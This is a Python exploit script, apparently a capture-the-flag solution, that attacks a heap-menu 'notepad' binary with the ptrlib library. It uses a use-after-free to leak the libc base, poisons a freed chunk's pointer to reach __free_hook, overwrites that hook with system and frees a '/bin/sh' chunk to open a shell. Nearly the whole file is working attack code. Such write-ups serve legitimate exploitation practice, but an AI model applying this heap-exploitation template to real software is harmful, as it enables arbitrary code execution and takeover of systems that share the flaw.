from ptrlib import *

file = "./notepad"
e = ELF(file)
libc = ELF("./libc.so.6")
sock = Process(file)
#sock = Socket("")
sock.debug = True

"""
Choose an option!
[*] 1. Create a note
[*] 2. View the note
[*] 3. Edit the note
[*] 4. Remove the note
[*] 5. View the secret note
[*] 6. Exit
"""
def create_note(idx, size, content):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter("> ", idx) # note(0-9)
    sock.sendlineafter("> ", size)
    sock.sendlineafter("> ", content)

def view_note(idx):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter("> ", idx)
    return sock.recvline()

def edit_note(idx, content):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter("> ", idx)
    sock.sendlineafter("> ", content)

def remove_note(idx):
    sock.sendlineafter("> ", "4")
    sock.sendlineafter("> ", idx)

def secret_note():
    sock.sendlineafter("> ", "5")

def see_you():
    sock.sendlineafter("> ", "6")

sock.recvuntil("gift: ")
gift = int(sock.recvline(), 16)

create_note("0", "1280", "AAAA")
create_note("1", "16", "BBBB")
remove_note("0")

main_arena = libc.symbol("__malloc_hook") + 0x10
libc.base = u64(view_note("0")+b"\x00\x00") - main_arena - 0x60

create_note("2", "32", b"C"*0x20)
remove_note("2")
edit_note("2", p64(libc.symbol("__free_hook")))
create_note("3", "32", b"/bin/sh")
create_note("4", "32", p64(libc.symbol("system")))

remove_note("3")
sock.sendline("id")

sock.sh()

